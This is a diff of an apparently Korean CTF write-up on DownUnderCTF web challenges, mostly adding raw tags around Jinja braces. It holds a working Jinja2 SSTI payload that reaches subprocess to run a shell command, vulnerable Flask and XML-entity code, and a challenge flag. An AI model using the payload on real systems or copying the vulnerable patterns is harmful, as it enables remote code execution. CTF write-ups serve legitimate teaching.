@@ -61,13 +61,15 @@ if __name__ == '__main__':
 
 ```     
 
-`render_template_string()` 함수는 SSTI 취약점을 가지고 있어 RCE를 해주면 된다.
+`render_template_string()` 함수에 사용자 입력이 직접적으로 들어가기 때문에 SSTI 취약점이 발생한다. 
        
 ### Exploit Code    
       
+{% raw %}   
 ```python
 {{ ''.__class__.__mro__[1].__subclasses__()[213]("grep -r 'DUCTF' *", shell=True,stdout=-1).communicate()}}
 ```      
+{% endraw %}   
      
 ### Flag
 DUCTF{PaRrOt_EmU_ReNdErS_AnYtHiNg}
@@ -92,11 +94,11 @@ def index():
             parser = etree.XMLParser(resolve_entities=True)
             root = etree.fromstring(xml_data, parser=parser)
         except etree.XMLSyntaxError as e:
-            return render_template_string('<div style="color:red;">Error parsing XML: {{ error }}</div>', error=str(e))
+            return render_template_string('<div style="color:red;">Error parsing XML: {% raw %}{{ error }}{% endraw %}</div>', error=str(e))
         feedback_element = root.find('feedback')
         if feedback_element is not None:
             feedback = feedback_element.text
-            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback)
+            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {% raw %}{{ feedback }}{% endraw %}</div>', feedback=feedback)
         else:
             return render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>')
 
@@ -599,8 +601,8 @@ def report():
 ```html
 <div class="card">
     <div class="card-body">
-        <h5 class="card-title"><a href="/blog/{{blog.id}}">{{blog.title}}</a></h5>
-        <p class="card-text">{{blog.content[:100]}}...</p>
+        <h5 class="card-title"><a href="/blog/{% raw %}{{blog.id}}{% endraw %}">{% raw %}{{blog.title}}{% endraw %}</a></h5>
+        <p class="card-text">{% raw %}{{blog.content[:100]}}{% endraw %}...</p>
     </div>
 </div>
 ```       
